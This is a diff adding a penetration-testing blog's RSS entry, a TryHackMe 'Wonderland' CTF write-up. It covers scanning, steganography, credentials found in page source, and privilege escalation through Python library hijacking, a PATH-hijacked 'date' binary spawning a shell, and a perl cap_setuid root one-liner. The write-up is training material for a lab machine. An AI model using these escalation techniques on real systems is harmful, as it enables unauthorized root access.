@@ -6,8 +6,319 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Tue, 01 Sep 2020 00:00:00 +0000</lastBuildDate>
+        <lastBuildDate>Sat, 12 Sep 2020 00:00:00 +0000</lastBuildDate>
         <atom:link href="https://0xSh1v4.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Tryhackme- Wonderland Writeup</title>
+            <link>https://0xSh1v4.github.io/posts/2020/09/tryhackme-wonderland-writeup/</link>
+            <pubDate>Sat, 12 Sep 2020 00:00:00 +0000</pubDate>
+            
+            <guid>https://0xSh1v4.github.io/posts/2020/09/tryhackme-wonderland-writeup/</guid>
+            <description>The following write up is for the machine: Wonderland
+Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</description>
+            <content type="html"><![CDATA[<p>The following write up is for the machine: Wonderland</p>
+<p><a href="https://www.tryhackme.com">Tryhackme</a> is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</p>
+<h2 id="synopsis">Synopsis</h2>
+<p><a href="https://www.tryhackme.com/room/wonderland">Wonderland</a> is a wonderful machine with lots of interesting things to learn. Especially privilege escalation part is the best so far I&rsquo;ve done, You have to escalate three times which includes different weak SUID permssion and then weak SUID Capabilities configurations which allow us to obtain the root and user flag at the end.</p>
+<h2 id="scanning-and-enumeration-of-the-network">Scanning and Enumeration of the network</h2>
+<p>As usual, let us run the nmap tool to can the target network.</p>
+<h3 id="nmap-results">Nmap Results:</h3>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Wonderland]
+└─$ nmap -sC -sV -oA top 10.10.20.227
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-12 01:37 CEST
+Nmap scan report for 10.10.20.227
+Host is up (0.081s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
+|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
+|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
+80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Follow the white rabbit.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.24 seconds
+</code></pre><p>We found only two ports (22 and 80) open for this device. We also see that ssh runs on port 22 and http on port 80 with the version (GOlang net/http server)lets find the gobuster results</p>
+<h3 id="gobuster-results">Gobuster Results:</h3>
+<p>We have obtained the below results from the gobuster.</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Wonderland]
+└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.20.227
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.20.227
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/09/12 01:37:48 Starting gobuster
+===============================================================
+/img (Status: 301)
+/r (Status: 301)
+/poem (Status: 301)
+/http%3A%2F%2Fwww (Status: 301)
+/http%3A%2F%2Fyoutube (Status: 301)
+/http%3A%2F%2Fblogs (Status: 301)
+/http%3A%2F%2Fblog (Status: 301)
+/**http%3A%2F%2Fwww (Status: 301)
+/http%3A%2F%2Fcommunity (Status: 301)
+/http%3A%2F%2Fradar (Status: 301)
+/http%3A%2F%2Fjeremiahgrossman (Status: 301)
+/http%3A%2F%2Fweblog (Status: 301)
+/http%3A%2F%2Fswik (Status: 301)
+===============================================================
+2020/09/12 01:54:06 Finished
+===============================================================
+</code></pre><p>On port 80, we have the webpage.</p>
+<p>Rabbit Machine Homepage:
+<figure>
+    <img src="/Tryhackme/Wonderland/1.png"
+         alt="Tryhackme: Wonderland machine - Homepage"/> <figcaption>
+            <p>Tryhackme: Wonderland machine - Homepage</p>
+        </figcaption>
+</figure>
+</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>I have downloaded the image and tried to check if there are any infos hidden inside the image file.</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Wonderland]
+└─$ steghide --extract -sf white_rabbit_1.jpg
+Enter passphrase:
+wrote extracted data to &quot;hint.txt&quot;.                     
+
+┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Wonderland]
+└─$ cat hint.txt
+follow the r a b b i t
+</code></pre><p>We just got this information.</p>
+<p>Further looking into /img location, I have found three image files.</p>
+<figure>
+    <img src="/Tryhackme/Wonderland/2.png"
+         alt="Tryhackme: Wonderland machine - Image Files"/> <figcaption>
+            <p>Tryhackme: Wonderland machine - Image Files</p>
+        </figcaption>
+</figure>
+
+<p>I have tried to decrypt the three, but couldn&rsquo;t find anything except the hint saying &ldquo;follow the rabbit&rdquo;.</p>
+<p>From the gobuster results, we found the /r path. So, I have tried adding /a next to /r, so it becomes /r/a and when I fulfill it according to the hint, which we got, then it will be</p>
+<figure>
+    <img src="/Tryhackme/Wonderland/3.png"
+         alt="Tryhackme: Wonderland machine - Follow the rabbit"/> <figcaption>
+            <p>Tryhackme: Wonderland machine - Follow the rabbit</p>
+        </figcaption>
+</figure>
+
+<p>Now, we again went to the deadend. I didn&rsquo;t know what I had to do after this.</p>
+<p>I just looked into the source and code and I saw some sensitive credentials.</p>
+<figure>
+    <img src="/Tryhackme/Wonderland/4.png"
+         alt="Tryhackme: Wonderland machine - Sensitive Information"/> <figcaption>
+            <p>Tryhackme: Wonderland machine - Sensitive Information</p>
+        </figcaption>
+</figure>
+
+<p>Now, I have tried to use this creds for SSH and luckily,we got the shell popped up into the machine.
+<figure>
+    <img src="/Tryhackme/Wonderland/5.png"
+         alt="Tryhackme: Wonderland machine - SSH as ALice"/> <figcaption>
+            <p>Tryhackme: Wonderland machine - SSH as ALice</p>
+        </figcaption>
+</figure>
+</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>We found the following information from the /home directory:</p>
+<pre><code>alice@wonderland:/home$ ls
+alice  hatter  rabbit  tryhackme
+alice@wonderland:/home$ ls alice/
+root.txt  walrus_and_the_carpenter.py
+alice@wonderland:/home$ ls -la alice/
+total 40
+drwxr-xr-x 5 alice alice 4096 May 25 17:52 .
+drwxr-xr-x 6 root  root  4096 May 25 17:52 ..
+lrwxrwxrwx 1 root  root     9 May 25 17:52 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 alice alice  220 May 25 02:36 .bash_logout
+-rw-r--r-- 1 alice alice 3771 May 25 02:36 .bashrc
+drwx------ 2 alice alice 4096 May 25 16:37 .cache
+drwx------ 3 alice alice 4096 May 25 16:37 .gnupg
+drwxrwxr-x 3 alice alice 4096 May 25 02:52 .local
+-rw-r--r-- 1 alice alice  807 May 25 02:36 .profile
+-rw------- 1 root  root    66 May 25 17:08 root.txt
+-rw-r--r-- 1 root  root  3577 May 25 02:43 walrus_and_the_carpenter.py
+alice@wonderland:/home$
+</code></pre><p>So, I ran sudo -l, to see if it works.</p>
+<pre><code>alice@wonderland:/home$ sudo -l
+Matching Defaults entries for alice on wonderland:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alice may run the following commands on wonderland:
+    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+</code></pre><p>we found that alice can run the following script with sudo as rabbit user.</p>
+<p>Looking at the following script, we found the random python library was included.</p>
+<figure>
+    <img src="/Tryhackme/Wonderland/6.png"
+         alt="Tryhackme: Wonderland machine - python executable library"/> <figcaption>
+            <p>Tryhackme: Wonderland machine - python executable library</p>
+        </figcaption>
+</figure>
+
+<p>Then, I tried to create a python file name random.py with the script and try to escalate to rabbit user. (Took a while to identify, before that I found few other ways to escalate priv but it can&rsquo;t be done from Alice user.)</p>
+<figure>
+    <img src="/Tryhackme/Wonderland/7.png"
+         alt="Tryhackme: Wonderland machine - Escalation to Rabbit"/> <figcaption>
+            <p>Tryhackme: Wonderland machine - Escalation to Rabbit</p>
+        </figcaption>
+</figure>
+
+<p>Just created a file name random with the following line and executed as the user rabbit to elevate the priv to rabbit.</p>
+<h2 id="post-exploitation">Post-Exploitation:</h2>
+<p>Rabbit can able to execute the teaparty file.</p>
+<pre><code>rabbit@wonderland:/home/rabbit$ ls
+teaParty
+rabbit@wonderland:/home/rabbit$ find / -perm -u=s -type f 2&gt;/dev/null
+/home/rabbit/teaParty
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/chsh
+/usr/bin/newuidmap
+/usr/bin/traceroute6.iputils
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/newgidmap
+/usr/bin/pkexec
+/usr/bin/sudo
+/bin/fusermount
+/bin/umount
+/bin/ping
+/bin/mount
+/bin/su
+rabbit@wonderland:/home/rabbit$ /home/rabbit/teaParty
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+Probably by Sat, 12 Sep 2020 12:36:31 +0000
+Ask very nicely, and I will give you some tea while you wait for him
+ok
+Segmentation fault (core dumped)
+</code></pre><p>So, It seems like we need to escalate the privilege for the user <strong>Hatter</strong>. But it has to do with this file. I have tried strace command, but haven&rsquo;t found anything interesting. So, I have downloaded the file and tried to examine it.</p>
+<pre><code>──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Wonderland]
+└─$ strings teaParty          
+/lib64/ld-linux-x86-64.so.2
+2U~4
+libc.so.6
+setuid
+puts
+getchar
+system
+__cxa_finalize
+setgid
+__libc_start_main
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u/UH
+[]A\A]A^A_
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+/bin/echo -n 'Probably by ' &amp;&amp; date --date='next hour' -R
+Ask very nicely, and I will give you some tea while you wait for him
+Segmentation fault (core dumped)
+;*3$&quot;
+GCC: (Debian 8.3.0-6) 8.3.0
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.7325
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+</code></pre><p>From the above, I found the &ldquo;date&rdquo; binary has been used to run with a relative path. So, now its more like the previous exploitation technique. So, lets create a date executable file.</p>
+<pre><code>rabbit@wonderland:/home/rabbit$ cat date
+#!/bin/bash
+/bin/sh
+</code></pre><p>Now we gave the executable permission for the file. Now we need to add this path to the env.</p>
+<figure>
+    <img src="/Tryhackme/Wonderland/8.png"
+         alt="Tryhackme: Wonderland machine - Set ENV variable to elevate priv to Hatter"/> <figcaption>
+            <p>Tryhackme: Wonderland machine - Set ENV variable to elevate priv to Hatter</p>
+        </figcaption>
+</figure>
+
+<p>So, now the binary will look for the date first from the /home/rabbit directory.</p>
+<p>So, lets execute the script.</p>
+<pre><code>rabbit@wonderland:/home/rabbit$ ./teaParty
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+Probably by $ id
+uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
+$ whoami
+hatter
+</code></pre><p>So, we have escalated our priv to hatter.</p>
+<p>Lets change this shell to full spawn tty.</p>
+<p><code>python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p>
+<figure>
+    <img src="/Tryhackme/Wonderland/9.png"
+         alt="Tryhackme: Wonderland machine - Escalation to Rabbit"/> <figcaption>
+            <p>Tryhackme: Wonderland machine - Escalation to Rabbit</p>
+        </figcaption>
+</figure>
+
+<p>Now, we have obtained the password from the hatter home directory.</p>
+<p>lets do su hatter with the password to logged in as a 100% priv user.</p>
+<p>Before when I tried Linpeas.sh script, I found the SUID capabilities is being set for this Hatter/root to excute the perl.</p>
+<pre><code>hatter@wonderland:~$ id
+uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
+hatter@wonderland:~$ getcap -r / 2&gt;/dev/null
+/usr/bin/perl5.26.1 = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+</code></pre><p>Now, lets elevate the privileges using the following command to get the root.</p>
+<p>Read more: <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/">SUID-Capabilities</a></p>
+<pre><code>hatter@wonderland:/tmp$ getcap -r / 2&gt;/dev/null
+/usr/bin/perl5.26.1 = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+hatter@wonderland:/tmp$ /usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec &quot;/bin/bash&quot;;'
+root@wonderland:/tmp# id
+uid=0(root) gid=1003(hatter) groups=1003(hatter)
+root@wonderland:/tmp# whoami
+root
+</code></pre><p>Now, we got the user.txt from /root folder and the root.txt from the alice folder.</p>
+<figure>
+    <img src="/Tryhackme/Wonderland/10.png"
+         alt="Tryhackme: Wonderland machine - Getting root.txt file"/> <figcaption>
+            <p>Tryhackme: Wonderland machine - Getting root.txt file</p>
+        </figcaption>
+</figure>
+
+<p>And thats how we got the root flag. To be honest, I spend lots of time in the first escalation part from alice to rabbit, it din&rsquo;t strike to me in the beginning. I loved the escalation in this machine from Alice -&gt; Rabbit-&gt; Hatter -&gt; Root. Learned so much out of this box.</p>
+<p>Thanks for reading! Prost! 🍺</p>
+<p>If you have any questions: Feel free to contact me.</p>
+<p>Twitter Profile: <a href="https://twitter.com/Sh1v4_R4jU">https://twitter.com/Sh1v4_R4jU</a></p>
+<p>TryHackMe Profile: <a href="https://tryhackme.com/p/Whiterose">https://tryhackme.com/p/Whiterose</a></p>
+<p>HTB Profile: <a href="https://www.hackthebox.eu/home/users/profile/167190">https://www.hackthebox.eu/home/users/profile/167190</a></p>
+<p><figure>
+    <img src="/HTB_profile.png"
+         alt="HTB_Profile"/> 
+</figure>
+
+<figure>
+    <img src="https://tryhackme-badges.s3.amazonaws.com/Whiterose.png"
+         alt="Tryhackme"/> 
+</figure>
+</p>
+]]></content>
+        </item>
         
         <item>
             <title>Tryhackme- Anonymous Writeup</title>
